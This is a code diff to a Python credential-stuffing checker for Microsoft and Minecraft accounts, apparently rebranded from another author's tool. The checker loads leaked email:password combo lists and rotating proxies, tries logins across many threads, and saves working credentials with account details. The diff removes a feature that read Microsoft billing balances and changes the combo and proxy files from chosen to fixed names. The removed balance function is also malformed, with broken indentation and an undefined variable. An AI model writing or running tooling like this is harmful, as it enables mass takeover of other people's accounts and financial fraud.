@@ -64,7 +64,6 @@ class Capture:
         self.banned = None
         self.namechanged = None
         self.lastchanged = None
-        self.balance = None
 
     def builder(self):
         message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
@@ -79,7 +78,6 @@ class Capture:
         if config.get('hypixelban') is True: message+=f"\nHypixel Banned: {self.banned or 'Unknown'}"
         if self.namechanged != None: message+=f"\nCan Change Name: {self.namechanged}"
         if self.lastchanged != None: message+=f"\nLast Name Change: {self.lastchanged}"
-        if self.balance != None: message+=f"\nMicrosoft Balance: {self.balance}"
         return message+"\n============================\n"
 
     def notify(self):
@@ -258,32 +256,6 @@ class Capture:
                 if self.banned != None: break
                 tries+=1
                  
-    def check_balance(self):
-        global errors
-        if config.get('balance') is True:
-            tries = 0
-            while tries < maxretries:
-            try:
-                check = requests.get('https://account.microsoft.com/billing/payments', headers={'Authorization': f'Bearer {self.token}'}, proxies=getproxy(), verify=False)
-                if check.status_code == 200:
-                    if 'availableBalance' in check.text:
-                        balance = re.search(r'"availableBalance":\s*"([^"]+)"', check.text)
-                        if balance:
-                            self.balance = balance.group(1)
-                            with open(f"results/{fname}/balanced.txt", 'a') as f:
-                                f.write(f"{self.email}:{self.password} | Balance: {self.balance}\n")
-                    break
-                elif check.status_code == 429:
-                    if len(proxylist) < 5: 
-                        time.sleep(20)
-                    session.proxy = getproxy()
-                    continue
-                else:
-                    break
-            except:
-                tries += 1
-                retries += 1
-
     def handle(self):
         global hits
         hits+=1
@@ -515,46 +487,35 @@ def authenticate(email, password, tries = 0):
 
 def Load():
     global Combos, fname
-    filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file', filetypes=(("txt", "*.txt"), ("All files", "*.*")))
-    if filename is None:
-        print(Fore.LIGHTRED_EX+"Invalid File.")
+    try:
+        # Using a fixed combo file name in the same directory
+        fname = "combos"  # This will be the folder name in results
+        with open("combos.txt", 'r', encoding='utf-8') as e:
+            lines = e.readlines()
+            Combos = list(set(lines))
+            print(Fore.LIGHTBLUE_EX+f"[{str(len(lines) - len(Combos))}] Dupes Removed.")
+            print(Fore.LIGHTBLUE_EX+f"[{len(Combos)}] Combos Loaded.")
+    except:
+        print(Fore.LIGHTRED_EX+"Error: Make sure 'combos.txt' exists in the same folder as the script.")
         time.sleep(2)
-        Load()
-    else:
-        fname = os.path.splitext(os.path.basename(filename.name))[0]
-        try:
-            with open(filename.name, 'r+', encoding='utf-8') as e:
-                lines = e.readlines()
-                Combos = list(set(lines))
-                print(Fore.LIGHTBLUE_EX+f"[{str(len(lines) - len(Combos))}] Dupes Removed.")
-                print(Fore.LIGHTBLUE_EX+f"[{len(Combos)}] Combos Loaded.")
-        except:
-            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
-            time.sleep(2)
-            Load()
+        sys.exit()
 
 def Proxys():
     global proxylist
-    fileNameProxy = filedialog.askopenfile(mode='rb', title='Choose a Proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
-    if fileNameProxy is None:
-        print(Fore.LIGHTRED_EX+"Invalid File.")
-        time.sleep(2)
-        Proxys()
-    else:
-        try:
-            with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
-                ext = e.readlines()
-                for line in ext:
-                    try:
-                        proxyline = line.split()[0].replace('\n', '')
-                        proxylist.append(proxyline)
-                    except: pass
+    try:
+        with open("proxies.txt", 'r', encoding='utf-8', errors='ignore') as e:
+            ext = e.readlines()
+            for line in ext:
+                try:
+                    proxyline = line.split()[0].replace('\n', '')
+                    proxylist.append(proxyline)
+                except: pass
             print(Fore.LIGHTBLUE_EX+f"Loaded [{len(proxylist)}] lines.")
             time.sleep(2)
-        except Exception:
-            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
-            time.sleep(2)
-            Proxys()
+    except:
+        print(Fore.LIGHTRED_EX+"Error: Make sure 'proxies.txt' exists in the same folder as the script.")
+        time.sleep(2)
+        sys.exit()
 
 def logscreen():
     global cpm, cpm1
@@ -694,7 +655,6 @@ Last Name Change: <lastchanged>'''}
     config.set('hypixelban', str_to_bool(read_config['Captures']['Hypixel Ban']))
     config.set('namechange', str_to_bool(read_config['Captures']['Name Change Availability']))
     config.set('lastchanged', str_to_bool(read_config['Captures']['Last Name Change']))
-    config.set('balance', str_to_bool(read_config['Captures']['Microsoft Balance']))
 
 def get_proxies():
     global proxylist
@@ -764,7 +724,7 @@ def banproxyload():
 
 def Main():
     global proxytype, screen
-    utils.set_title("MSMC by KillinMachine")
+    utils.set_title("Sexter By Storm_xd")
     os.system('clear')
     try:
         loadconfig()
@@ -789,27 +749,35 @@ def Main():
         Main()
     print(Fore.LIGHTBLUE_EX+"Screen: [1] CUI - [2] Log")
     screen = repr(readchar.readkey())
-    print(Fore.LIGHTBLUE_EX+"Select your combos")
+    
+    # Load combos
+    print(Fore.LIGHTBLUE_EX+"Loading combos from combos.txt...")
     Load()
+    
+    # Load proxies if needed
     if proxytype != "'4'" and proxytype != "'5'":
-        print(Fore.LIGHTBLUE_EX+"Select your proxies")
+        print(Fore.LIGHTBLUE_EX+"Loading proxies from proxies.txt...")
         Proxys()
+    
     if config.get('proxylessban') == False and config.get('hypixelban') is True:
-        print(Fore.LIGHTBLUE_EX+"Select your SOCKS5 Ban Checking Proxies.")
+        print(Fore.LIGHTBLUE_EX+"Loading ban checking proxies from banproxies.txt...")
         banproxyload()
-    if proxytype =="'5'":
+        
+    if proxytype == "'5'":
         print(Fore.LIGHTGREEN_EX+"Scraping Proxies Please Wait.")
         threading.Thread(target=get_proxies).start()
         while len(proxylist) == 0: 
             time.sleep(1)
+            
     if not os.path.exists("results"): os.makedirs("results/")
     if not os.path.exists('results/'+fname): os.makedirs('results/'+fname)
+    
     if screen == "'1'": cuiscreen()
     elif screen == "'2'": logscreen()
     else: cuiscreen()
+    
     with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
         futures = [executor.submit(Checker, combo) for combo in Combos]
         concurrent.futures.wait(futures)
     finishedscreen()
     input()
-Main()
